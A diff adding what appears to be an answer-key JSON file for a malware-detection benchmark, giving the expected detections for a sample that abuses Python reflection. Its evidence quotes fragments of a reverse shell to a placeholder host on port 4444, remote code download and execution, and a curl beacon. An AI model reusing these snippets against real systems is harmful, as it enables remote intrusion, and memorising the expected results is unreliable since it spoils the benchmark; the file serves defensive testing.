@@ -1,0 +1,75 @@
+{
+  "sample_id": "adv-029-reflection",
+  "test_category": "dynamic_code_obfuscation",
+  "benchmark_marker": "BENCHMARK_TEST_ONLY",
+  "expected_detections": [
+    {
+      "detection_id": "DYNAMIC-005",
+      "detection_name": "Reflection-based execution",
+      "description": "Use of importlib and reflection for dynamic code loading and execution",
+      "severity": "critical",
+      "confidence": 0.95,
+      "evidence": [
+        "importlib.import_module(plugin_name)",
+        "importlib.util.spec_from_file_location(module_name, file_path)",
+        "spec.loader.exec_module(module)",
+        "getattr(module, method_name)"
+      ]
+    },
+    {
+      "detection_id": "DYNAMIC-006",
+      "detection_name": "Runtime module creation",
+      "description": "Creating modules from code strings at runtime",
+      "severity": "critical",
+      "confidence": 0.94,
+      "evidence": [
+        "types.ModuleType(name)",
+        "exec(code_string, module.__dict__)",
+        "sys.modules[name] = module"
+      ]
+    },
+    {
+      "detection_id": "BACKDOOR-001",
+      "detection_name": "Reverse shell code",
+      "description": "Code for establishing reverse shell connection",
+      "severity": "critical",
+      "confidence": 0.98,
+      "evidence": [
+        "s.connect((\"[REDACTED].example.com\", 4444))",
+        "subprocess.call([\"/bin/sh\", \"-i\"], stdin=s.fileno()...)"
+      ]
+    },
+    {
+      "detection_id": "REMOTE-001",
+      "detection_name": "Remote plugin loading",
+      "description": "Downloading and executing code from remote URLs",
+      "severity": "critical",
+      "confidence": 0.96,
+      "evidence": [
+        "urllib.request.urlopen(plugin_url).read()",
+        "self.load_from_path('remote_plugin', path)"
+      ]
+    },
+    {
+      "detection_id": "EXEC-001",
+      "detection_name": "System command execution",
+      "description": "Executing system commands via reflected method calls",
+      "severity": "critical",
+      "confidence": 0.95,
+      "evidence": [
+        "execute_plugin_method('os', 'system', 'curl https://[REDACTED].example.com/beacon')"
+      ]
+    }
+  ],
+  "obfuscation_techniques": [
+    "importlib for dynamic module imports",
+    "types.ModuleType for runtime module creation",
+    "sys.modules injection",
+    "Method chain resolution via string splitting",
+    "hasattr/getattr for string-based method access"
+  ],
+  "risk_score": 9.8,
+  "verdict": "确认恶意",
+  "verdict_reasoning": "Comprehensive abuse of Python's reflection and importlib systems to load and execute arbitrary code. Contains explicit reverse shell payload and remote code loading capabilities. Multiple layers of dynamic execution obscure the malicious intent.",
+  "recommended_action": "block_and_alert"
+}
